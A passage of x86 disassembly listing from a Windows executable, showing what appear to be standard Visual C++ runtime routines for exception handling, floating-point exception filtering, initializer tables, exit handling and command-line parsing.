  4056cd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4056d0:	50                   	push   %eax
  4056d1:	e8 b4 e5 ff ff       	call   0x403c8a
  4056d6:	59                   	pop    %ecx
  4056d7:	59                   	pop    %ecx
  4056d8:	33 c0                	xor    %eax,%eax
  4056da:	eb cf                	jmp    0x4056ab
  4056dc:	33 db                	xor    %ebx,%ebx
  4056de:	8b 75 0c             	mov    0xc(%ebp),%esi
  4056e1:	8b 7d 08             	mov    0x8(%ebp),%edi
  4056e4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4056e7:	89 46 fc             	mov    %eax,-0x4(%esi)
  4056ea:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4056ed:	a3 dc bf 40 00       	mov    %eax,0x40bfdc
  4056f2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4056f5:	a3 e0 bf 40 00       	mov    %eax,0x40bfe0
  4056fa:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%edi)
  405700:	75 27                	jne    0x405729
  405702:	83 7f 10 03          	cmpl   $0x3,0x10(%edi)
  405706:	75 21                	jne    0x405729
  405708:	81 7f 14 20 05 93 19 	cmpl   $0x19930520,0x14(%edi)
  40570f:	75 18                	jne    0x405729
  405711:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  405714:	75 13                	jne    0x405729
  405716:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  405719:	74 0e                	je     0x405729
  40571b:	e8 d2 e5 ff ff       	call   0x403cf2
  405720:	50                   	push   %eax
  405721:	57                   	push   %edi
  405722:	e8 f1 01 00 00       	call   0x405918
  405727:	59                   	pop    %ecx
  405728:	59                   	pop    %ecx
  405729:	c3                   	ret
  40572a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40572e:	8b 00                	mov    (%eax),%eax
  405730:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  405736:	75 19                	jne    0x405751
  405738:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40573c:	75 13                	jne    0x405751
  40573e:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  405745:	75 0a                	jne    0x405751
  405747:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  40574b:	75 04                	jne    0x405751
  40574d:	6a 01                	push   $0x1
  40574f:	58                   	pop    %eax
  405750:	c3                   	ret
  405751:	33 c0                	xor    %eax,%eax
  405753:	c3                   	ret
  405754:	55                   	push   %ebp
  405755:	8b ec                	mov    %esp,%ebp
  405757:	6a ff                	push   $0xffffffff
  405759:	68 60 92 40 00       	push   $0x409260
  40575e:	68 04 62 40 00       	push   $0x406204
  405763:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405769:	50                   	push   %eax
  40576a:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405771:	83 ec 0c             	sub    $0xc,%esp
  405774:	53                   	push   %ebx
  405775:	56                   	push   %esi
  405776:	57                   	push   %edi
  405777:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40577a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40577d:	8b 41 04             	mov    0x4(%ecx),%eax
  405780:	85 c0                	test   %eax,%eax
  405782:	0f 84 75 01 00 00    	je     0x4058fd
  405788:	80 78 08 00          	cmpb   $0x0,0x8(%eax)
  40578c:	0f 84 6b 01 00 00    	je     0x4058fd
  405792:	8b 41 08             	mov    0x8(%ecx),%eax
  405795:	85 c0                	test   %eax,%eax
  405797:	0f 84 60 01 00 00    	je     0x4058fd
  40579d:	8b 55 0c             	mov    0xc(%ebp),%edx
  4057a0:	8d 7c 10 0c          	lea    0xc(%eax,%edx,1),%edi
  4057a4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4057a8:	f6 01 08             	testb  $0x8,(%ecx)
  4057ab:	74 44                	je     0x4057f1
  4057ad:	8b 75 08             	mov    0x8(%ebp),%esi
  4057b0:	6a 01                	push   $0x1
  4057b2:	ff 76 18             	push   0x18(%esi)
  4057b5:	e8 13 1b 00 00       	call   0x4072cd
  4057ba:	59                   	pop    %ecx
  4057bb:	59                   	pop    %ecx
  4057bc:	85 c0                	test   %eax,%eax
  4057be:	0f 84 30 01 00 00    	je     0x4058f4
  4057c4:	6a 01                	push   $0x1
  4057c6:	57                   	push   %edi
  4057c7:	e8 1d 1b 00 00       	call   0x4072e9
  4057cc:	59                   	pop    %ecx
  4057cd:	59                   	pop    %ecx
  4057ce:	85 c0                	test   %eax,%eax
  4057d0:	0f 84 1e 01 00 00    	je     0x4058f4
  4057d6:	8b 46 18             	mov    0x18(%esi),%eax
  4057d9:	89 07                	mov    %eax,(%edi)
  4057db:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4057de:	83 c1 08             	add    $0x8,%ecx
  4057e1:	51                   	push   %ecx
  4057e2:	50                   	push   %eax
  4057e3:	e8 97 01 00 00       	call   0x40597f
  4057e8:	59                   	pop    %ecx
  4057e9:	59                   	pop    %ecx
  4057ea:	89 07                	mov    %eax,(%edi)
  4057ec:	e9 08 01 00 00       	jmp    0x4058f9
  4057f1:	8b 75 14             	mov    0x14(%ebp),%esi
  4057f4:	f6 06 01             	testb  $0x1,(%esi)
  4057f7:	74 52                	je     0x40584b
  4057f9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4057fc:	6a 01                	push   $0x1
  4057fe:	ff 73 18             	push   0x18(%ebx)
  405801:	e8 c7 1a 00 00       	call   0x4072cd
  405806:	59                   	pop    %ecx
  405807:	59                   	pop    %ecx
  405808:	85 c0                	test   %eax,%eax
  40580a:	0f 84 e4 00 00 00    	je     0x4058f4
  405810:	6a 01                	push   $0x1
  405812:	57                   	push   %edi
  405813:	e8 d1 1a 00 00       	call   0x4072e9
  405818:	59                   	pop    %ecx
  405819:	59                   	pop    %ecx
  40581a:	85 c0                	test   %eax,%eax
  40581c:	0f 84 d2 00 00 00    	je     0x4058f4
  405822:	ff 76 14             	push   0x14(%esi)
  405825:	ff 73 18             	push   0x18(%ebx)
  405828:	57                   	push   %edi
  405829:	e8 42 ed ff ff       	call   0x404570
  40582e:	83 c4 0c             	add    $0xc,%esp
  405831:	83 7e 14 04          	cmpl   $0x4,0x14(%esi)
  405835:	0f 85 be 00 00 00    	jne    0x4058f9
  40583b:	8b 07                	mov    (%edi),%eax
  40583d:	85 c0                	test   %eax,%eax
  40583f:	0f 84 b4 00 00 00    	je     0x4058f9
  405845:	83 c6 08             	add    $0x8,%esi
  405848:	56                   	push   %esi
  405849:	eb 97                	jmp    0x4057e2
  40584b:	83 7e 18 00          	cmpl   $0x0,0x18(%esi)
  40584f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405852:	6a 01                	push   $0x1
  405854:	ff 73 18             	push   0x18(%ebx)
  405857:	75 3a                	jne    0x405893
  405859:	e8 6f 1a 00 00       	call   0x4072cd
  40585e:	59                   	pop    %ecx
  40585f:	59                   	pop    %ecx
  405860:	85 c0                	test   %eax,%eax
  405862:	0f 84 8c 00 00 00    	je     0x4058f4
  405868:	6a 01                	push   $0x1
  40586a:	57                   	push   %edi
  40586b:	e8 79 1a 00 00       	call   0x4072e9
  405870:	59                   	pop    %ecx
  405871:	59                   	pop    %ecx
  405872:	85 c0                	test   %eax,%eax
  405874:	74 7e                	je     0x4058f4
  405876:	ff 76 14             	push   0x14(%esi)
  405879:	83 c6 08             	add    $0x8,%esi
  40587c:	56                   	push   %esi
  40587d:	ff 73 18             	push   0x18(%ebx)
  405880:	e8 fa 00 00 00       	call   0x40597f
  405885:	59                   	pop    %ecx
  405886:	59                   	pop    %ecx
  405887:	50                   	push   %eax
  405888:	57                   	push   %edi
  405889:	e8 e2 ec ff ff       	call   0x404570
  40588e:	83 c4 0c             	add    $0xc,%esp
  405891:	eb 66                	jmp    0x4058f9
  405893:	e8 35 1a 00 00       	call   0x4072cd
  405898:	59                   	pop    %ecx
  405899:	59                   	pop    %ecx
  40589a:	85 c0                	test   %eax,%eax
  40589c:	74 56                	je     0x4058f4
  40589e:	6a 01                	push   $0x1
  4058a0:	57                   	push   %edi
  4058a1:	e8 43 1a 00 00       	call   0x4072e9
  4058a6:	59                   	pop    %ecx
  4058a7:	59                   	pop    %ecx
  4058a8:	85 c0                	test   %eax,%eax
  4058aa:	74 48                	je     0x4058f4
  4058ac:	ff 76 18             	push   0x18(%esi)
  4058af:	e8 51 1a 00 00       	call   0x407305
  4058b4:	59                   	pop    %ecx
  4058b5:	85 c0                	test   %eax,%eax
  4058b7:	74 3b                	je     0x4058f4
  4058b9:	f6 06 04             	testb  $0x4,(%esi)
  4058bc:	74 1c                	je     0x4058da
  4058be:	6a 01                	push   $0x1
  4058c0:	8d 46 08             	lea    0x8(%esi),%eax
  4058c3:	50                   	push   %eax
  4058c4:	ff 73 18             	push   0x18(%ebx)
  4058c7:	e8 b3 00 00 00       	call   0x40597f
  4058cc:	59                   	pop    %ecx
  4058cd:	59                   	pop    %ecx
  4058ce:	50                   	push   %eax
  4058cf:	ff 76 18             	push   0x18(%esi)
  4058d2:	57                   	push   %edi
  4058d3:	e8 c7 e0 ff ff       	call   0x40399f
  4058d8:	eb 1f                	jmp    0x4058f9
  4058da:	8d 46 08             	lea    0x8(%esi),%eax
  4058dd:	50                   	push   %eax
  4058de:	ff 73 18             	push   0x18(%ebx)
  4058e1:	e8 99 00 00 00       	call   0x40597f
  4058e6:	59                   	pop    %ecx
  4058e7:	59                   	pop    %ecx
  4058e8:	50                   	push   %eax
  4058e9:	ff 76 18             	push   0x18(%esi)
  4058ec:	57                   	push   %edi
  4058ed:	e8 a6 e0 ff ff       	call   0x403998
  4058f2:	eb 05                	jmp    0x4058f9
  4058f4:	e8 59 01 00 00       	call   0x405a52
  4058f9:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4058fd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405900:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405907:	5f                   	pop    %edi
  405908:	5e                   	pop    %esi
  405909:	5b                   	pop    %ebx
  40590a:	c9                   	leave
  40590b:	c3                   	ret
  40590c:	6a 01                	push   $0x1
  40590e:	58                   	pop    %eax
  40590f:	c3                   	ret
  405910:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405913:	e9 e4 00 00 00       	jmp    0x4059fc
  405918:	55                   	push   %ebp
  405919:	8b ec                	mov    %esp,%ebp
  40591b:	6a ff                	push   $0xffffffff
  40591d:	68 70 92 40 00       	push   $0x409270
  405922:	68 04 62 40 00       	push   $0x406204
  405927:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40592d:	50                   	push   %eax
  40592e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405935:	51                   	push   %ecx
  405936:	51                   	push   %ecx
  405937:	53                   	push   %ebx
  405938:	56                   	push   %esi
  405939:	57                   	push   %edi
  40593a:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40593d:	8b 45 08             	mov    0x8(%ebp),%eax
  405940:	85 c0                	test   %eax,%eax
  405942:	74 1b                	je     0x40595f
  405944:	8b 48 1c             	mov    0x1c(%eax),%ecx
  405947:	8b 49 04             	mov    0x4(%ecx),%ecx
  40594a:	85 c9                	test   %ecx,%ecx
  40594c:	74 11                	je     0x40595f
  40594e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405952:	51                   	push   %ecx
  405953:	ff 70 18             	push   0x18(%eax)
  405956:	e8 3d e0 ff ff       	call   0x403998
  40595b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40595f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405962:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405969:	5f                   	pop    %edi
  40596a:	5e                   	pop    %esi
  40596b:	5b                   	pop    %ebx
  40596c:	c9                   	leave
  40596d:	c3                   	ret
  40596e:	33 c0                	xor    %eax,%eax
  405970:	38 45 0c             	cmp    %al,0xc(%ebp)
  405973:	0f 95 c0             	setne  %al
  405976:	c3                   	ret
  405977:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40597a:	e9 7d 00 00 00       	jmp    0x4059fc
  40597f:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  405983:	56                   	push   %esi
  405984:	8b 74 24 08          	mov    0x8(%esp),%esi
  405988:	8b 01                	mov    (%ecx),%eax
  40598a:	8b 51 04             	mov    0x4(%ecx),%edx
  40598d:	03 c6                	add    %esi,%eax
  40598f:	85 d2                	test   %edx,%edx
  405991:	7c 0d                	jl     0x4059a0
  405993:	8b 34 32             	mov    (%edx,%esi,1),%esi
  405996:	8b 49 08             	mov    0x8(%ecx),%ecx
  405999:	8b 0c 0e             	mov    (%esi,%ecx,1),%ecx
  40599c:	03 ca                	add    %edx,%ecx
  40599e:	03 c1                	add    %ecx,%eax
  4059a0:	5e                   	pop    %esi
  4059a1:	c3                   	ret
  4059a2:	cc                   	int3
  4059a3:	cc                   	int3
  4059a4:	cc                   	int3
  4059a5:	cc                   	int3
  4059a6:	cc                   	int3
  4059a7:	cc                   	int3
  4059a8:	cc                   	int3
  4059a9:	cc                   	int3
  4059aa:	cc                   	int3
  4059ab:	cc                   	int3
  4059ac:	cc                   	int3
  4059ad:	cc                   	int3
  4059ae:	cc                   	int3
  4059af:	cc                   	int3
  4059b0:	55                   	push   %ebp
  4059b1:	8b ec                	mov    %esp,%ebp
  4059b3:	83 ec 04             	sub    $0x4,%esp
  4059b6:	53                   	push   %ebx
  4059b7:	51                   	push   %ecx
  4059b8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4059bb:	83 c0 0c             	add    $0xc,%eax
  4059be:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4059c1:	8b 45 08             	mov    0x8(%ebp),%eax
  4059c4:	55                   	push   %ebp
  4059c5:	ff 75 10             	push   0x10(%ebp)
  4059c8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4059cb:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  4059ce:	e8 42 e3 ff ff       	call   0x403d15
  4059d3:	56                   	push   %esi
  4059d4:	57                   	push   %edi
  4059d5:	ff d0                	call   *%eax
  4059d7:	5f                   	pop    %edi
  4059d8:	5e                   	pop    %esi
  4059d9:	8b dd                	mov    %ebp,%ebx
  4059db:	5d                   	pop    %ebp
  4059dc:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4059df:	55                   	push   %ebp
  4059e0:	8b eb                	mov    %ebx,%ebp
  4059e2:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4059e8:	75 05                	jne    0x4059ef
  4059ea:	b9 02 00 00 00       	mov    $0x2,%ecx
  4059ef:	51                   	push   %ecx
  4059f0:	e8 20 e3 ff ff       	call   0x403d15
  4059f5:	5d                   	pop    %ebp
  4059f6:	59                   	pop    %ecx
  4059f7:	5b                   	pop    %ebx
  4059f8:	c9                   	leave
  4059f9:	c2 0c 00             	ret    $0xc
  4059fc:	55                   	push   %ebp
  4059fd:	8b ec                	mov    %esp,%ebp
  4059ff:	6a ff                	push   $0xffffffff
  405a01:	68 80 92 40 00       	push   $0x409280
  405a06:	68 04 62 40 00       	push   $0x406204
  405a0b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405a11:	50                   	push   %eax
  405a12:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405a19:	51                   	push   %ecx
  405a1a:	51                   	push   %ecx
  405a1b:	53                   	push   %ebx
  405a1c:	56                   	push   %esi
  405a1d:	57                   	push   %edi
  405a1e:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405a21:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405a25:	a1 e8 bf 40 00       	mov    0x40bfe8,%eax
  405a2a:	85 c0                	test   %eax,%eax
  405a2c:	74 16                	je     0x405a44
  405a2e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405a35:	ff d0                	call   *%eax
  405a37:	eb 07                	jmp    0x405a40
  405a39:	6a 01                	push   $0x1
  405a3b:	58                   	pop    %eax
  405a3c:	c3                   	ret
  405a3d:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405a40:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405a44:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405a48:	e8 00 00 00 00       	call   0x405a4d
  405a4d:	e9 cb 18 00 00       	jmp    0x40731d
  405a52:	55                   	push   %ebp
  405a53:	8b ec                	mov    %esp,%ebp
  405a55:	6a ff                	push   $0xffffffff
  405a57:	68 98 92 40 00       	push   $0x409298
  405a5c:	68 04 62 40 00       	push   $0x406204
  405a61:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405a67:	50                   	push   %eax
  405a68:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405a6f:	51                   	push   %ecx
  405a70:	51                   	push   %ecx
  405a71:	53                   	push   %ebx
  405a72:	56                   	push   %esi
  405a73:	57                   	push   %edi
  405a74:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405a77:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405a7b:	a1 f4 b9 40 00       	mov    0x40b9f4,%eax
  405a80:	85 c0                	test   %eax,%eax
  405a82:	74 16                	je     0x405a9a
  405a84:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405a8b:	ff d0                	call   *%eax
  405a8d:	eb 07                	jmp    0x405a96
  405a8f:	6a 01                	push   $0x1
  405a91:	58                   	pop    %eax
  405a92:	c3                   	ret
  405a93:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405a96:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405a9a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405a9e:	e8 00 00 00 00       	call   0x405aa3
  405aa3:	e9 54 ff ff ff       	jmp    0x4059fc
  405aa8:	a1 f4 c3 40 00       	mov    0x40c3f4,%eax
  405aad:	85 c0                	test   %eax,%eax
  405aaf:	74 02                	je     0x405ab3
  405ab1:	ff d0                	call   *%eax
  405ab3:	68 1c b0 40 00       	push   $0x40b01c
  405ab8:	68 0c b0 40 00       	push   $0x40b00c
  405abd:	e8 ce 00 00 00       	call   0x405b90
  405ac2:	68 08 b0 40 00       	push   $0x40b008
  405ac7:	68 00 b0 40 00       	push   $0x40b000
  405acc:	e8 bf 00 00 00       	call   0x405b90
  405ad1:	83 c4 10             	add    $0x10,%esp
  405ad4:	c3                   	ret
  405ad5:	6a 00                	push   $0x0
  405ad7:	6a 00                	push   $0x0
  405ad9:	ff 74 24 0c          	push   0xc(%esp)
  405add:	e8 15 00 00 00       	call   0x405af7
  405ae2:	83 c4 0c             	add    $0xc,%esp
  405ae5:	c3                   	ret
  405ae6:	6a 00                	push   $0x0
  405ae8:	6a 01                	push   $0x1
  405aea:	ff 74 24 0c          	push   0xc(%esp)
  405aee:	e8 04 00 00 00       	call   0x405af7
  405af3:	83 c4 0c             	add    $0xc,%esp
  405af6:	c3                   	ret
  405af7:	57                   	push   %edi
  405af8:	6a 01                	push   $0x1
  405afa:	5f                   	pop    %edi
  405afb:	39 3d 34 c0 40 00    	cmp    %edi,0x40c034
  405b01:	75 11                	jne    0x405b14
  405b03:	ff 74 24 08          	push   0x8(%esp)
  405b07:	ff 15 9c 90 40 00    	call   *0x40909c
  405b0d:	50                   	push   %eax
  405b0e:	ff 15 98 90 40 00    	call   *0x409098
  405b14:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  405b19:	53                   	push   %ebx
  405b1a:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  405b1e:	89 3d 30 c0 40 00    	mov    %edi,0x40c030
  405b24:	88 1d 2c c0 40 00    	mov    %bl,0x40c02c
  405b2a:	75 3c                	jne    0x405b68
  405b2c:	a1 f0 c3 40 00       	mov    0x40c3f0,%eax
  405b31:	85 c0                	test   %eax,%eax
  405b33:	74 22                	je     0x405b57
  405b35:	8b 0d ec c3 40 00    	mov    0x40c3ec,%ecx
  405b3b:	56                   	push   %esi
  405b3c:	8d 71 fc             	lea    -0x4(%ecx),%esi
  405b3f:	3b f0                	cmp    %eax,%esi
  405b41:	72 13                	jb     0x405b56
  405b43:	8b 06                	mov    (%esi),%eax
  405b45:	85 c0                	test   %eax,%eax
  405b47:	74 02                	je     0x405b4b
  405b49:	ff d0                	call   *%eax
  405b4b:	83 ee 04             	sub    $0x4,%esi
  405b4e:	3b 35 f0 c3 40 00    	cmp    0x40c3f0,%esi
  405b54:	73 ed                	jae    0x405b43
  405b56:	5e                   	pop    %esi
  405b57:	68 28 b0 40 00       	push   $0x40b028
  405b5c:	68 20 b0 40 00       	push   $0x40b020
  405b61:	e8 2a 00 00 00       	call   0x405b90
  405b66:	59                   	pop    %ecx
  405b67:	59                   	pop    %ecx
  405b68:	68 34 b0 40 00       	push   $0x40b034
  405b6d:	68 2c b0 40 00       	push   $0x40b02c
  405b72:	e8 19 00 00 00       	call   0x405b90
  405b77:	59                   	pop    %ecx
  405b78:	59                   	pop    %ecx
  405b79:	85 db                	test   %ebx,%ebx
  405b7b:	5b                   	pop    %ebx
  405b7c:	75 10                	jne    0x405b8e
  405b7e:	ff 74 24 08          	push   0x8(%esp)
  405b82:	89 3d 34 c0 40 00    	mov    %edi,0x40c034
  405b88:	ff 15 68 90 40 00    	call   *0x409068
  405b8e:	5f                   	pop    %edi
  405b8f:	c3                   	ret
  405b90:	56                   	push   %esi
  405b91:	8b 74 24 08          	mov    0x8(%esp),%esi
  405b95:	3b 74 24 0c          	cmp    0xc(%esp),%esi
  405b99:	73 0d                	jae    0x405ba8
  405b9b:	8b 06                	mov    (%esi),%eax
  405b9d:	85 c0                	test   %eax,%eax
  405b9f:	74 02                	je     0x405ba3
  405ba1:	ff d0                	call   *%eax
  405ba3:	83 c6 04             	add    $0x4,%esi
  405ba6:	eb ed                	jmp    0x405b95
  405ba8:	5e                   	pop    %esi
  405ba9:	c3                   	ret
  405baa:	55                   	push   %ebp
  405bab:	8b ec                	mov    %esp,%ebp
  405bad:	53                   	push   %ebx
  405bae:	ff 75 08             	push   0x8(%ebp)
  405bb1:	e8 35 01 00 00       	call   0x405ceb
  405bb6:	85 c0                	test   %eax,%eax
  405bb8:	59                   	pop    %ecx
  405bb9:	0f 84 20 01 00 00    	je     0x405cdf
  405bbf:	8b 58 08             	mov    0x8(%eax),%ebx
  405bc2:	85 db                	test   %ebx,%ebx
  405bc4:	0f 84 15 01 00 00    	je     0x405cdf
  405bca:	83 fb 05             	cmp    $0x5,%ebx
  405bcd:	75 0c                	jne    0x405bdb
  405bcf:	83 60 08 00          	andl   $0x0,0x8(%eax)
  405bd3:	6a 01                	push   $0x1
  405bd5:	58                   	pop    %eax
  405bd6:	e9 0d 01 00 00       	jmp    0x405ce8
  405bdb:	83 fb 01             	cmp    $0x1,%ebx
  405bde:	0f 84 f6 00 00 00    	je     0x405cda
  405be4:	8b 0d 38 c0 40 00    	mov    0x40c038,%ecx
  405bea:	89 4d 08             	mov    %ecx,0x8(%ebp)
  405bed:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405bf0:	89 0d 38 c0 40 00    	mov    %ecx,0x40c038
  405bf6:	8b 48 04             	mov    0x4(%eax),%ecx
  405bf9:	83 f9 08             	cmp    $0x8,%ecx
  405bfc:	0f 85 c8 00 00 00    	jne    0x405cca
  405c02:	8b 0d 70 ba 40 00    	mov    0x40ba70,%ecx
  405c08:	8b 15 74 ba 40 00    	mov    0x40ba74,%edx
  405c0e:	03 d1                	add    %ecx,%edx
  405c10:	56                   	push   %esi
  405c11:	3b ca                	cmp    %edx,%ecx
  405c13:	7d 15                	jge    0x405c2a
  405c15:	8d 34 49             	lea    (%ecx,%ecx,2),%esi
  405c18:	2b d1                	sub    %ecx,%edx
  405c1a:	8d 34 b5 00 ba 40 00 	lea    0x40ba00(,%esi,4),%esi
  405c21:	83 26 00             	andl   $0x0,(%esi)
  405c24:	83 c6 0c             	add    $0xc,%esi
  405c27:	4a                   	dec    %edx
  405c28:	75 f7                	jne    0x405c21
  405c2a:	8b 00                	mov    (%eax),%eax
  405c2c:	8b 35 7c ba 40 00    	mov    0x40ba7c,%esi
  405c32:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  405c37:	75 0c                	jne    0x405c45
  405c39:	c7 05 7c ba 40 00 83 	movl   $0x83,0x40ba7c
  405c40:	00 00 00 
  405c43:	eb 70                	jmp    0x405cb5
  405c45:	3d 90 00 00 c0       	cmp    $0xc0000090,%eax
  405c4a:	75 0c                	jne    0x405c58
  405c4c:	c7 05 7c ba 40 00 81 	movl   $0x81,0x40ba7c
  405c53:	00 00 00 
  405c56:	eb 5d                	jmp    0x405cb5
  405c58:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  405c5d:	75 0c                	jne    0x405c6b
  405c5f:	c7 05 7c ba 40 00 84 	movl   $0x84,0x40ba7c
  405c66:	00 00 00 
  405c69:	eb 4a                	jmp    0x405cb5
  405c6b:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  405c70:	75 0c                	jne    0x405c7e
  405c72:	c7 05 7c ba 40 00 85 	movl   $0x85,0x40ba7c
  405c79:	00 00 00 
  405c7c:	eb 37                	jmp    0x405cb5
  405c7e:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  405c83:	75 0c                	jne    0x405c91
  405c85:	c7 05 7c ba 40 00 82 	movl   $0x82,0x40ba7c
  405c8c:	00 00 00 
  405c8f:	eb 24                	jmp    0x405cb5
  405c91:	3d 8f 00 00 c0       	cmp    $0xc000008f,%eax
  405c96:	75 0c                	jne    0x405ca4
  405c98:	c7 05 7c ba 40 00 86 	movl   $0x86,0x40ba7c
  405c9f:	00 00 00 
  405ca2:	eb 11                	jmp    0x405cb5
  405ca4:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  405ca9:	75 0a                	jne    0x405cb5
  405cab:	c7 05 7c ba 40 00 8a 	movl   $0x8a,0x40ba7c
  405cb2:	00 00 00 
  405cb5:	ff 35 7c ba 40 00    	push   0x40ba7c
  405cbb:	6a 08                	push   $0x8
  405cbd:	ff d3                	call   *%ebx
  405cbf:	59                   	pop    %ecx
  405cc0:	89 35 7c ba 40 00    	mov    %esi,0x40ba7c
  405cc6:	59                   	pop    %ecx
  405cc7:	5e                   	pop    %esi
  405cc8:	eb 08                	jmp    0x405cd2
  405cca:	83 60 08 00          	andl   $0x0,0x8(%eax)
  405cce:	51                   	push   %ecx
  405ccf:	ff d3                	call   *%ebx
  405cd1:	59                   	pop    %ecx
  405cd2:	8b 45 08             	mov    0x8(%ebp),%eax
  405cd5:	a3 38 c0 40 00       	mov    %eax,0x40c038
  405cda:	83 c8 ff             	or     $0xffffffff,%eax
  405cdd:	eb 09                	jmp    0x405ce8
  405cdf:	ff 75 0c             	push   0xc(%ebp)
  405ce2:	ff 15 a0 90 40 00    	call   *0x4090a0
  405ce8:	5b                   	pop    %ebx
  405ce9:	5d                   	pop    %ebp
  405cea:	c3                   	ret
  405ceb:	8b 54 24 04          	mov    0x4(%esp),%edx
  405cef:	8b 0d 78 ba 40 00    	mov    0x40ba78,%ecx
  405cf5:	39 15 f8 b9 40 00    	cmp    %edx,0x40b9f8
  405cfb:	56                   	push   %esi
  405cfc:	b8 f8 b9 40 00       	mov    $0x40b9f8,%eax
  405d01:	74 15                	je     0x405d18
  405d03:	8d 34 49             	lea    (%ecx,%ecx,2),%esi
  405d06:	8d 34 b5 f8 b9 40 00 	lea    0x40b9f8(,%esi,4),%esi
  405d0d:	83 c0 0c             	add    $0xc,%eax
  405d10:	3b c6                	cmp    %esi,%eax
  405d12:	73 04                	jae    0x405d18
  405d14:	39 10                	cmp    %edx,(%eax)
  405d16:	75 f5                	jne    0x405d0d
  405d18:	8d 0c 49             	lea    (%ecx,%ecx,2),%ecx
  405d1b:	5e                   	pop    %esi
  405d1c:	8d 0c 8d f8 b9 40 00 	lea    0x40b9f8(,%ecx,4),%ecx
  405d23:	3b c1                	cmp    %ecx,%eax
  405d25:	73 04                	jae    0x405d2b
  405d27:	39 10                	cmp    %edx,(%eax)
  405d29:	74 02                	je     0x405d2d
  405d2b:	33 c0                	xor    %eax,%eax
  405d2d:	c3                   	ret
  405d2e:	83 3d e8 c3 40 00 00 	cmpl   $0x0,0x40c3e8
  405d35:	75 05                	jne    0x405d3c
  405d37:	e8 fe 19 00 00       	call   0x40773a
  405d3c:	56                   	push   %esi
  405d3d:	8b 35 24 d5 40 00    	mov    0x40d524,%esi
  405d43:	8a 06                	mov    (%esi),%al
  405d45:	3c 22                	cmp    $0x22,%al
  405d47:	75 25                	jne    0x405d6e
  405d49:	8a 46 01             	mov    0x1(%esi),%al
  405d4c:	46                   	inc    %esi
  405d4d:	3c 22                	cmp    $0x22,%al
  405d4f:	74 15                	je     0x405d66
  405d51:	84 c0                	test   %al,%al
  405d53:	74 11                	je     0x405d66
  405d55:	0f b6 c0             	movzbl %al,%eax
  405d58:	50                   	push   %eax
  405d59:	e8 d6 15 00 00       	call   0x407334
  405d5e:	85 c0                	test   %eax,%eax
  405d60:	59                   	pop    %ecx
  405d61:	74 e6                	je     0x405d49
  405d63:	46                   	inc    %esi
  405d64:	eb e3                	jmp    0x405d49
  405d66:	80 3e 22             	cmpb   $0x22,(%esi)
  405d69:	75 0d                	jne    0x405d78
  405d6b:	46                   	inc    %esi
  405d6c:	eb 0a                	jmp    0x405d78
  405d6e:	3c 20                	cmp    $0x20,%al
  405d70:	76 06                	jbe    0x405d78
  405d72:	46                   	inc    %esi
  405d73:	80 3e 20             	cmpb   $0x20,(%esi)
  405d76:	77 fa                	ja     0x405d72
  405d78:	8a 06                	mov    (%esi),%al
  405d7a:	84 c0                	test   %al,%al
  405d7c:	74 04                	je     0x405d82
